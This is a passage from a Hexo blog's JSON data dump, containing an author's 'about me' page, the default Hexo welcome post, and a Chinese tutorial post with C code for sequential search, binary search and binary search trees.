一路打怪升级中！！！\n>\n> 热爱可抵岁月漫长~~\n\n\n### Part II Learning\n - HTML、CSS、JS；\n - Node、Flask、Vue、React；\n - Echarts、G6；\n - Element UI、Antd；\n\n\n\n### Part III Contact\n\n-  Wechat:wechat_wanglisheng\n\n-  QQ:1034067956\n-  Email:wlsbb945@163.com\n-  NetEase Music:https://music.163.com/#/user/home?id=418165896\n<!-- \n![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n","source":"about/index.md","raw":"---\ntitle: aboutme\ndate: 2020-10-27 10:15:49\ntype: \"aboutme\"\n---\n\n## About Me\n\n<!-- ![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n### Part I Introduction\n\n- Master of Computer Science （Grade One、`South-East University`、`Cyber-Sapce Security`）\n- Front-End Programmer For `Nanjing Cursec`\n\n> 90后小菜鸟程序员，喜欢唱跳rap打篮球~\n>\n> 走在学前端的大路上~ 一路打怪升级中！！！\n>\n> 热爱可抵岁月漫长~~\n\n\n### Part II Learning\n - HTML、CSS、JS；\n - Node、Flask、Vue、React；\n - Echarts、G6；\n - Element UI、Antd；\n\n\n\n### Part III Contact\n\n-  Wechat:wechat_wanglisheng\n\n-  QQ:1034067956\n-  Email:wlsbb945@163.com\n-  NetEase Music:https://music.163.com/#/user/home?id=418165896\n<!-- \n![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n","updated":"2023-04-04T14:05:04.725Z","path":"about/index.html","_id":"clg2a7kbc0000489c6xcug8cq","comments":1,"layout":"page","content":"<h2 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About Me\"></a>About Me</h2><!-- ![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n<h3 id=\"Part-I-Introduction\"><a href=\"#Part-I-Introduction\" class=\"headerlink\" title=\"Part I Introduction\"></a>Part I Introduction</h3><ul>\n<li>Master of Computer Science （Grade One、<code>South-East University</code>、<code>Cyber-Sapce Security</code>）</li>\n<li>Front-End Programmer For <code>Nanjing Cursec</code></li>\n</ul>\n<blockquote>\n<p>90后小菜鸟程序员，喜欢唱跳rap打篮球~</p>\n<p>走在学前端的大路上~ 一路打怪升级中！！！</p>\n<p>热爱可抵岁月漫长~~</p>\n</blockquote>\n<h3 id=\"Part-II-Learning\"><a href=\"#Part-II-Learning\" class=\"headerlink\" title=\"Part II Learning\"></a>Part II Learning</h3><ul>\n<li>HTML、CSS、JS；</li>\n<li>Node、Flask、Vue、React；</li>\n<li>Echarts、G6；</li>\n<li>Element UI、Antd；</li>\n</ul>\n<h3 id=\"Part-III-Contact\"><a href=\"#Part-III-Contact\" class=\"headerlink\" title=\"Part III Contact\"></a>Part III Contact</h3><ul>\n<li><p> Wechat:wechat_wanglisheng</p>\n</li>\n<li><p> QQ:1034067956</p>\n</li>\n<li><p> Email:<a href=\"mailto:&#x77;&#x6c;&#115;&#x62;&#x62;&#57;&#52;&#53;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;\">&#x77;&#x6c;&#115;&#x62;&#x62;&#57;&#52;&#53;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p>\n</li>\n<li><p> NetEase Music:<a href=\"https://music.163.com/#/user/home?id=418165896\">https://music.163.com/#/user/home?id=418165896</a></p>\n<!-- \n![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) --></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About Me\"></a>About Me</h2><!-- ![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) -->\n\n<h3 id=\"Part-I-Introduction\"><a href=\"#Part-I-Introduction\" class=\"headerlink\" title=\"Part I Introduction\"></a>Part I Introduction</h3><ul>\n<li>Master of Computer Science （Grade One、<code>South-East University</code>、<code>Cyber-Sapce Security</code>）</li>\n<li>Front-End Programmer For <code>Nanjing Cursec</code></li>\n</ul>\n<blockquote>\n<p>90后小菜鸟程序员，喜欢唱跳rap打篮球~</p>\n<p>走在学前端的大路上~ 一路打怪升级中！！！</p>\n<p>热爱可抵岁月漫长~~</p>\n</blockquote>\n<h3 id=\"Part-II-Learning\"><a href=\"#Part-II-Learning\" class=\"headerlink\" title=\"Part II Learning\"></a>Part II Learning</h3><ul>\n<li>HTML、CSS、JS；</li>\n<li>Node、Flask、Vue、React；</li>\n<li>Echarts、G6；</li>\n<li>Element UI、Antd；</li>\n</ul>\n<h3 id=\"Part-III-Contact\"><a href=\"#Part-III-Contact\" class=\"headerlink\" title=\"Part III Contact\"></a>Part III Contact</h3><ul>\n<li><p> Wechat:wechat_wanglisheng</p>\n</li>\n<li><p> QQ:1034067956</p>\n</li>\n<li><p> Email:<a href=\"mailto:&#x77;&#x6c;&#115;&#x62;&#x62;&#57;&#52;&#53;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;\">&#x77;&#x6c;&#115;&#x62;&#x62;&#57;&#52;&#53;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></p>\n</li>\n<li><p> NetEase Music:<a href=\"https://music.163.com/#/user/home?id=418165896\">https://music.163.com/#/user/home?id=418165896</a></p>\n<!-- \n![](https://s3.bmp.ovh/imgs/2023/03/27/b3312324adb06368.png) --></li>\n</ul>\n"}],"Post":[{"title":"Hello, Hexo!","date":"2020-10-28T11:39:45.000Z","cover":"./img/nice.jpg","_content":"Welcome to [Hexo](https://hexo.io/)! \nThis is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello, Hexo!\ndate: 2020-10-28 19:39:45\ncover: ./img/nice.jpg\n---\nWelcome to [Hexo](https://hexo.io/)! \nThis is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"updated":"2020-11-04T13:04:18.000Z","_id":"clg29ra840000xk9cb9uq2xd7","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>!<br>This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo new <span class=\"hljs-string\">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo server<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo generate<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo deploy<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>!<br>This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo new <span class=\"hljs-string\">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo server<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo generate<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo deploy<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"CH7 查找","date":"2021-08-25T12:57:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n## 一、顺序查找\n\nMSL最大查找长度，ASL平均查找长度；\n\nASL成功=SumPi（n-i+1） ASL失败=n+1\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\ntypedef struct\n{\n    keyType key;\n} SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n} SeqTable;\n\nint Search_Seq(SeqTable ST)\n{\n    int index;\n    keyType key;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&key);\n    ST.elem[ST.length].key=key;\n    for(index=0; ST.elem[index].key!=key; ++index);\n    if(index<ST.length)\n    {\n        printf(\"Find in %d\",index);\n        return index;\n    }\n    else return -1;\n}\n\nvoid main()\n{\n    SeqTable SQT;\n    keyType key;\n    int index;\n    SElemType Data[MAXSIZE]= {34,44,43,12,53,55,73,64,77};\n    SQT.elem=Data;\n    SQT.length=9;\n    index=Search_Seq(SQT);\n}\n//若找不到报错，检查scanf函数是否添加了&符号v(#｀-_ゝ-)\n\n```\n\n\n\n## 二、折半查找(静态)\n\n必须使用顺序存贮且元素按照关键字升序；\n\n```c\n#include<stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n{\n    keyType key;\n}SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n}SeqTable;\n\nint SearchBin(SeqTable ST)\n{\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&target);\n    while(low<=high)\n    {\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        {\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        }\n        else if(target<ST.elem[mid].key)\n        {\n            high=mid-1;\n        }\n        else\n        {\n            low=mid+1;\n        }\n    }\n    return -1;\n}\n\nvoid main()\n{\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]={10,13,15,20,65,66,90,100,120};\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        {\n            printf(\"No such a data.\\n\");\n        }\n}\n\n#include<stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n{\n    keyType key;\n}SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n}SeqTable;\n\nint SearchBin(SeqTable ST)\n{\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&target);\n    while(low<=high)\n    {\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        {\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        }\n        else if(target<ST.elem[mid].key)\n        {\n            high=mid-1;\n        }\n        else\n        {\n            low=mid+1;\n        }\n    }\n    return -1;\n}\n\nvoid main()\n{\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]={10,13,15,20,65,66,90,100,120};\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        {\n            printf(\"No such a data.\\n\");\n        }\n}\n\n\n```\n\n\n\n## 三、二叉排序树查找（动态）\n\n二叉树中所有的左孩子小于其父节点，右孩子大于其父节点\n\n若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n\ntypedef int keyType;\n\ntypedef struct BTNode\n{\n    keyType key;\n    struct BTNode *lchild,*rchild;\n}BTNode,*BiTree;\n\nBiTree SearchBSTree(BTNode *T,keyType key)\n{\n    if(!T||key==T->key) return T;\n    else if(key<T->key) return(SearchBSTree(T->lchild,key));\n    else return(SearchBSTree(T->rchild,key));\n}\n\nBTNode *SearchBST(BTNode *T,keyType key,int *flag)\n{\n    BTNode *p,*pre;\n    //flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；\n    *flag=0;\n    if(!T)\n    {\n        *flag=0;\n        return T;\n    }\n    p=T;\n    pre=T;\n    while(p!=NULL&&key!=p->key)\n    {\n        pre=p;\n        if(key<p->key) p=p->lchild;\n        else p=p->rchild;\n    }\n    if(p!=NULL&&key==p->key)\n    {\n        *flag=1;\n        return p;\n    }\n    else\n    {\n        *flag=0;\n        return pre;\n    }\n}\n\nBTNode *InsertBSTNode(BTNode *T,keyType key)\n{\n    BTNode *p,*s;\n    int flag=0;\n    //查找是否存在相同节点\n    p=SearchBST(T,key,&flag);\n    if(!flag)\n    {\n        s=(BTNode*)malloc(sizeof(BTNode));\n        s->key=key;\n        s->lchild=s->rchild=NULL;\n        if(!p)\n        {\n            return s;\n        }\n        else if(key<p->key) p->lchild=s;\n        else p->rchild=s;\n    }\n    return T;\n}\n\nBiTree Create(keyType key)\n{\n\n    BiTree T;\n    T=(BTNode*)malloc(sizeof(BTNode));\n    if(T==NULL)\n    {\n        printf(\"Asaign the memory failurely.\");\n        return NULL;\n    }\n    T->key=key;\n    T->lchild=T->rchild=NULL;\n    return T;\n}\n\nvoid VisitNode(keyType key)\n{\n    printf(\"%d \",key);\n}\n\nvoid InorderTree(BiTree T)\n{\n    if(T!=NULL)\n    {\n        InorderTree(T->lchild);\n        VisitNode(T->key);\n        InorderTree(T->rchild);\n    }\n}\n\n\nvoid main()\n{\n\n    BTNode *ST;\n    keyType mykey;\n    int index,nums;\n    printf(\"Enter the nodes' number:\");\n    scanf(\"%d\",&nums);\n    printf(\"Please enter the root's data:\");\n    scanf(\"%d\",&mykey);\n    ST=Create(mykey);\n\n    for(index=1;index<nums;index++)\n    {\n        keyType tmp_key;\n        printf(\"Please enter the %d node:\",index);\n        scanf(\"%d\",&tmp_key);\n        ST=InsertBSTNode(ST,tmp_key);\n    }\n    InorderTree(ST);\n    printf(\"Please enter the target data:\");\n    scanf(\"%d\",&mykey);\n    ST=SearchBSTree(ST,mykey);\n    if(!ST)\n    {\n        printf(\"No such a data.\\n\");\n    }\n    else\n    {\n        printf(\"Find it:%d!\",mykey);\n    }\n\n}\n\n```\n\n\n\n## 四、哈希表\n\n### 1.适用于动态查找和静态查找\n\n### 2.常见哈希函数\n\n（1）直接定址：适合连续的分布；\n\n（2）除留取余：假定哈希表长m,取p<=m，一般选择不大于m的最大质数；\n\n### 3.处理冲突的方法\n\n（1）开放地址：Hi=(H(Key)+di)%m;\n\n​\t\ti.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；\n\n​\t\tii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；\n\n（2）链地址：在冲突的数据位置设置链表；","source":"_posts/CH7 查找.md","raw":"---\ntitle: CH7 查找\ndate: 2021-08-25 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg3.jpg\n---\n\n## 一、顺序查找\n\nMSL最大查找长度，ASL平均查找长度；\n\nASL成功=SumPi（n-i+1） ASL失败=n+1\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\ntypedef struct\n{\n    keyType key;\n} SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n} SeqTable;\n\nint Search_Seq(SeqTable ST)\n{\n    int index;\n    keyType key;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&key);\n    ST.elem[ST.length].key=key;\n    for(index=0; ST.elem[index].key!=key; ++index);\n    if(index<ST.length)\n    {\n        printf(\"Find in %d\",index);\n        return index;\n    }\n    else return -1;\n}\n\nvoid main()\n{\n    SeqTable SQT;\n    keyType key;\n    int index;\n    SElemType Data[MAXSIZE]= {34,44,43,12,53,55,73,64,77};\n    SQT.elem=Data;\n    SQT.length=9;\n    index=Search_Seq(SQT);\n}\n//若找不到报错，检查scanf函数是否添加了&符号v(#｀-_ゝ-)\n\n```\n\n\n\n## 二、折半查找(静态)\n\n必须使用顺序存贮且元素按照关键字升序；\n\n```c\n#include<stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n{\n    keyType key;\n}SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n}SeqTable;\n\nint SearchBin(SeqTable ST)\n{\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&target);\n    while(low<=high)\n    {\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        {\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        }\n        else if(target<ST.elem[mid].key)\n        {\n            high=mid-1;\n        }\n        else\n        {\n            low=mid+1;\n        }\n    }\n    return -1;\n}\n\nvoid main()\n{\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]={10,13,15,20,65,66,90,100,120};\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        {\n            printf(\"No such a data.\\n\");\n        }\n}\n\n#include<stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n{\n    keyType key;\n}SElemType;\n\ntypedef struct\n{\n    SElemType *elem;\n    int length;\n}SeqTable;\n\nint SearchBin(SeqTable ST)\n{\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&target);\n    while(low<=high)\n    {\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        {\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        }\n        else if(target<ST.elem[mid].key)\n        {\n            high=mid-1;\n        }\n        else\n        {\n            low=mid+1;\n        }\n    }\n    return -1;\n}\n\nvoid main()\n{\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]={10,13,15,20,65,66,90,100,120};\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        {\n            printf(\"No such a data.\\n\");\n        }\n}\n\n\n```\n\n\n\n## 三、二叉排序树查找（动态）\n\n二叉树中所有的左孩子小于其父节点，右孩子大于其父节点\n\n若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n\ntypedef int keyType;\n\ntypedef struct BTNode\n{\n    keyType key;\n    struct BTNode *lchild,*rchild;\n}BTNode,*BiTree;\n\nBiTree SearchBSTree(BTNode *T,keyType key)\n{\n    if(!T||key==T->key) return T;\n    else if(key<T->key) return(SearchBSTree(T->lchild,key));\n    else return(SearchBSTree(T->rchild,key));\n}\n\nBTNode *SearchBST(BTNode *T,keyType key,int *flag)\n{\n    BTNode *p,*pre;\n    //flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；\n    *flag=0;\n    if(!T)\n    {\n        *flag=0;\n        return T;\n    }\n    p=T;\n    pre=T;\n    while(p!=NULL&&key!=p->key)\n    {\n        pre=p;\n        if(key<p->key) p=p->lchild;\n        else p=p->rchild;\n    }\n    if(p!=NULL&&key==p->key)\n    {\n        *flag=1;\n        return p;\n    }\n    else\n    {\n        *flag=0;\n        return pre;\n    }\n}\n\nBTNode *InsertBSTNode(BTNode *T,keyType key)\n{\n    BTNode *p,*s;\n    int flag=0;\n    //查找是否存在相同节点\n    p=SearchBST(T,key,&flag);\n    if(!flag)\n    {\n        s=(BTNode*)malloc(sizeof(BTNode));\n        s->key=key;\n        s->lchild=s->rchild=NULL;\n        if(!p)\n        {\n            return s;\n        }\n        else if(key<p->key) p->lchild=s;\n        else p->rchild=s;\n    }\n    return T;\n}\n\nBiTree Create(keyType key)\n{\n\n    BiTree T;\n    T=(BTNode*)malloc(sizeof(BTNode));\n    if(T==NULL)\n    {\n        printf(\"Asaign the memory failurely.\");\n        return NULL;\n    }\n    T->key=key;\n    T->lchild=T->rchild=NULL;\n    return T;\n}\n\nvoid VisitNode(keyType key)\n{\n    printf(\"%d \",key);\n}\n\nvoid InorderTree(BiTree T)\n{\n    if(T!=NULL)\n    {\n        InorderTree(T->lchild);\n        VisitNode(T->key);\n        InorderTree(T->rchild);\n    }\n}\n\n\nvoid main()\n{\n\n    BTNode *ST;\n    keyType mykey;\n    int index,nums;\n    printf(\"Enter the nodes' number:\");\n    scanf(\"%d\",&nums);\n    printf(\"Please enter the root's data:\");\n    scanf(\"%d\",&mykey);\n    ST=Create(mykey);\n\n    for(index=1;index<nums;index++)\n    {\n        keyType tmp_key;\n        printf(\"Please enter the %d node:\",index);\n        scanf(\"%d\",&tmp_key);\n        ST=InsertBSTNode(ST,tmp_key);\n    }\n    InorderTree(ST);\n    printf(\"Please enter the target data:\");\n    scanf(\"%d\",&mykey);\n    ST=SearchBSTree(ST,mykey);\n    if(!ST)\n    {\n        printf(\"No such a data.\\n\");\n    }\n    else\n    {\n        printf(\"Find it:%d!\",mykey);\n    }\n\n}\n\n```\n\n\n\n## 四、哈希表\n\n### 1.适用于动态查找和静态查找\n\n### 2.常见哈希函数\n\n（1）直接定址：适合连续的分布；\n\n（2）除留取余：假定哈希表长m,取p<=m，一般选择不大于m的最大质数；\n\n### 3.处理冲突的方法\n\n（1）开放地址：Hi=(H(Key)+di)%m;\n\n​\t\ti.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；\n\n​\t\tii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；\n\n（2）链地址：在冲突的数据位置设置链表；","slug":"CH7 查找","published":1,"updated":"2021-08-25T14:30:44.000Z","_id":"clg29vydc0000ao9ce1noadl8","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"一、顺序查找\"><a href=\"#一、顺序查找\" class=\"headerlink\" title=\"一、顺序查找\"></a>一、顺序查找</h2><p>MSL最大查找长度，ASL平均查找长度；</p>\n<p>ASL成功=SumPi（n-i+1） ASL失败=n+1</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125; SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125; SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">Search_Seq</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index;<br>    keyType key;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;key);<br>    ST.elem[ST.length].key=key;<br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">0</span>; ST.elem[index].key!=key; ++index);<br>    <span class=\"hljs-keyword\">if</span>(index&lt;ST.length)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in %d&quot;</span>,index);<br>        <span class=\"hljs-keyword\">return</span> index;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>    SeqTable SQT;<br>    keyType key;<br>    <span class=\"hljs-type\">int</span> index;<br>    SElemType Data[MAXSIZE]= &#123;<span class=\"hljs-number\">34</span>,<span class=\"hljs-number\">44</span>,<span class=\"hljs-number\">43</span>,<span class=\"hljs-number\">12</span>,<span class=\"hljs-number\">53</span>,<span 